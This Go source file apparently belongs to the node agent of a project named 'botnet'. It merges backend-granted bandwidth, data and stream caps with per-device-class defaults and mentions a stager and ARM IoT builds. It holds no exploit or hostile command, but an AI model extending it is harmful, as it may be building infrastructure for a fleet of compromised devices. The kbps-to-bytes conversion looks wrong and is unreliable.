package agent

import (
	"sync"

	"github.com/botnet/botnet/pkg/proto"
)

// Entitlements son los topes concedidos por el backend y versionados
// por config_rev (BLUEPRINT §4). Un valor 0/vacio significa "ausente":
// la precedencia lo resuelve con el valor local y, si no hay local, con
// el perfil de clase.
type Entitlements struct {
	ConfigRev        uint32
	BandwidthCapKbps uint32
	MonthlyGbCap     uint32
	MaxStreams       uint32
	StableVersion    string
}

// ClassProfile devuelve los defaults por clase segun BLUEPRINT §2 y §7:
// tope de ancho 5/3/2 Mbps, monthly_gb_cap 150 (default del DDL) y 150
// streams nominales. Una clase desconocida cae a C: el mas frugal.
func ClassProfile(class byte) Entitlements {
	e := Entitlements{MonthlyGbCap: 150, MaxStreams: 150}
	switch class {
	case 'A':
		e.BandwidthCapKbps = 5000
	case 'B':
		e.BandwidthCapKbps = 3000
	default:
		e.BandwidthCapKbps = 2000
	}
	return e
}

// DeviceClassForArch mapea arch→clase como byte (nodes.device_class)
// para el perfil de entitlements; la version string del manifiesto vive
// en update.go. armv5/armv7 requieren GOARM del build; el stager puede
// fijarlo por entorno.
func DeviceClassForArch(arch string) byte {
	switch arch {
	case "amd64", "arm64":
		return 'A'
	case "armv5", "armv7", "arm":
		return 'B'
	default:
		return 'C'
	}
}

// EntitlementManager mantiene los topes vigentes con config_rev
// monotonico: un heartbeat con rev anterior no regresa el estado y un
// rev mayor aplica los topes nuevos sin reinicio (T-0306 AC1).
type EntitlementManager struct {
	mu    sync.RWMutex
	prof  Entitlements // default de la clase del dispositivo
	local Entitlements // concesso local (p.ej. stable_version del build)
	eff   Entitlements
	rev   uint32
}

func NewEntitlementManager(class byte, local Entitlements) *EntitlementManager {
	prof := ClassProfile(class)
	m := &EntitlementManager{prof: prof, local: local}
	m.eff = m.merge(Entitlements{})
	return m
}

// merge recomputa lo vigente: servidor gana donde hay valor, luego
// local, luego perfil. stable_version sigue la misma regla
// server > local (T-0306 AC2).
func (m *EntitlementManager) merge(server Entitlements) Entitlements {
	pickU := func(s, l, p uint32) uint32 {
		if s != 0 {
			return s
		}
		if l != 0 {
			return l
		}
		return p
	}
	pickS := func(s, l, p string) string {
		if s != "" {
			return s
		}
		if l != "" {
			return l
		}
		return p
	}
	return Entitlements{
		ConfigRev:        m.rev,
		BandwidthCapKbps: pickU(server.BandwidthCapKbps, m.local.BandwidthCapKbps, m.prof.BandwidthCapKbps),
		MonthlyGbCap:     pickU(server.MonthlyGbCap, m.local.MonthlyGbCap, m.prof.MonthlyGbCap),
		MaxStreams:       pickU(server.MaxStreams, m.local.MaxStreams, m.prof.MaxStreams),
		StableVersion:    pickS(server.StableVersion, m.local.StableVersion, m.prof.StableVersion),
	}
}

// Apply funde la respuesta del heartbeat. Devuelve false si el
// config_rev no es mayor (latido viejo o duplicado).
func (m *EntitlementManager) Apply(resp *proto.HeartbeatResponse) bool {
	if resp == nil {
		return false
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	if resp.ConfigRev <= m.eff.ConfigRev {
		return false
	}
	m.rev = resp.ConfigRev
	m.eff = m.merge(Entitlements{
		BandwidthCapKbps: resp.BandwidthCapKbps,
		MonthlyGbCap:     uint32(resp.MonthlyGbCap),
		MaxStreams:       uint32(resp.MaxStreams),
		StableVersion:    resp.StableVersion,
	})
	return true
}

// ApplyEnroll toma los entitlements que ya trae el 201 (T-0306 AC3:
// monthly_gb_cap=150 en el alta). Con config_rev 0 del alta se adoptan
// igual: el primer heartbeat con rev >= 1 podra volver a aplicar.
func (m *EntitlementManager) ApplyEnroll(resp *proto.EnrollAPIResponse) bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	if resp.ConfigRev != 0 && resp.ConfigRev <= m.eff.ConfigRev {
		return false
	}
	m.rev = resp.ConfigRev
	m.eff = m.merge(Entitlements{
		BandwidthCapKbps: resp.BandwidthCapKbps,
		MonthlyGbCap:     resp.MonthlyGbCap,
		MaxStreams:       resp.MaxStreams,
		StableVersion:    resp.StableVersion,
	})
	return true
}

func (m *EntitlementManager) Snapshot() Entitlements {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.eff
}

// BandwidthBytesPerSec es el tope efectivo para el token bucket del
// agente (§7); el gateway lo lee via HELLO, el agente lo aplica cerca
// de la fuente.
func (m *EntitlementManager) BandwidthBytesPerSec() uint64 {
	return uint64(m.Snapshot().BandwidthCapKbps) * 1024
}
